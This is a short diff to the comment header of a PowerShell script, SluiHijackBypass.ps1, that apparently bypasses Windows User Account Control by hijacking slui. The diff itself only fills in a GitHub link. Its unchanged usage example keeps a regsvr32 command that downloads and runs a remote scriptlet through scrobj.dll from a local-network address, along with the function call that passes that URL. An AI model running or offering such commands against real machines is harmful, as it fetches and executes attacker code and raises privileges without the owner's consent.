@@ -6,7 +6,7 @@
 	File Name  : SluiHijackBypass.ps1
 	Author     : Gushmazuko
 .LINK
-	https://github.com/
+	https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
 .EXAMPLE
 	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll":
 	SluiHijackBypass -http "http://192.168.0.10/runner.cst"
